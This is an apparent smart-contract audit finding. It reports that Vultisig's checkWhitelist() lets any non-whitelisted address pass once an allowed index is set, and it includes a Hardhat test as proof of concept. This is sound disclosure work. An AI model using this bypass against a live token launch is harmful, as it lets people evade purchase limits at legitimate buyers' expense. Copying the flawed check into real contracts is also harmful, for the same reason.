## [H] Vultisig whitelisting can be bypassed by anyone

Whitelist launch will be bricked. Anyone can buy tokens, and also bypass the 3 ETH limit by buying via other non-whitelisted accounts. This will have an impact on price and ruin the opportunities of legit whitelisted users.

Here's a diagram on the timelines of the launch. "WL Launch" is the affected phase.

### Vulnerability Details

The `checkWhitelist()` function makes an erroneous check here:

```solidity
    if (_allowedWhitelistIndex == 0 || _whitelistIndex[to] > _allowedWhitelistIndex) {
        revert NotWhitelisted();
    }
```

[Whitelist.sol#L216](repos/2024-06-vultisig/hardhat-vultisig/contracts/Whitelist.sol#L216)

`_allowedWhitelistIndex` is the [max index allowed](repos/2024-06-vultisig/hardhat-vultisig/contracts/Whitelist.sol#L38-L39), and works as a limit, not a whitelist flag. Once it is set (which must happen for all whitelists), any non-whitelisted user can bypass it. This is because `_whitelistIndex[to]` will be `0`, and `_whitelistIndex[to] > _allowedWhitelistIndex` will never revert (`0 > 1000`, for example).

### Proof of Concept

1. Add this test to `/2024-06-vultisig/hardhat-vultisig/test/unit/Whitelist.ts`.
2. Run the test `npx hardhat test`.

```typescript
it.only("Bypasses whitelisting", async function () {
    const { owner, whitelist, pool, otherAccount, mockOracleSuccess, mockContract } = await loadFixture(deployWhitelistFixture);

    await whitelist.setVultisig(mockContract);
    await whitelist.setLocked(false);
    await whitelist.setOracle(mockOracleSuccess);

    // `otherAccount` is not whitelisted and can't bypass the whitelist check
    await expect(whitelist.connect(mockContract).checkWhitelist(pool, otherAccount, 0)).to.be.revertedWithCustomError(
    whitelist,
    "NotWhitelisted",
    );

    // Until an `_allowedWhitelistIndex` limit is set
    // This value is intended as a limit, not as a flag not allow non-whitelisted users
    await whitelist.setAllowedWhitelistIndex(10);

    // `otherAccount` and any other user can now bypass the whitelisting
    await whitelist.connect(mockContract).checkWhitelist(pool, otherAccount, 0);
});
```
